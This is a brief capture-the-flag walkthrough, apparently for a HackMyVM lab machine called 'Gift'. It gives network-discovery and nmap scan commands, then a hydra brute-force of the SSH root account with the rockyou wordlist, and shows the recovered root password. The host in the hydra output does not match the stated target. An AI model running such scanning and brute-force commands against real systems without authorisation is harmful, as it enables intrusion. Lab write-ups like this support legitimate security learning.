# HMV-Gift
# Gift (Easy)
BanaN0nam3| 15.May.2023

_______________________________________________________________________

### Target IP: 192.168.56.102
## Kali_Machin_IP:192.168.56.103


## 1. Identify the target
Method #1: Fping
fping -aqg 192.168.56.0/24
Method #2: Netdiscover
sudo netdiscover -r 192.168.56.0/24
Method #3: Nmap
nmap -sn 192.168.56.0/24
Method #4 Scan network on windows
https://www.advanced-ip-scanner.com/

## 2. Nmapping

```bash
nmap -sC -sV  192.168.56.102
```

Result is an ssh server and a http server running nginx. The website contains nothing interesting. Just a text saying: "Dont Overthink. Really, Its simple." Doing a directory scan or a subdomain fuzzling, doesnt reveal anything at all. Even a "nikto" scan doesnt reveal anything useful. 

## 3. Bruteforce

Well time like this, calls for bruteforcing the ssh login. Ill bruteforce the root user because there isnt any other known user. You can use different tools to bruteforce it, but I will just use hydra:

```bash                                                                             
┌──(kali㉿kali)-[~]
└─$ sudo hydra -l root -P Desktop/rockyou.txt 192.168.56.102 ssh

```

After a few moment, it returns with a password:

```
[22][ssh] host: 192.168.1.112   login: root   password: simple
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
```

> user: root
> pass: simple

## 4. Getting the flag
Just ssh into it and get the 2 flags.
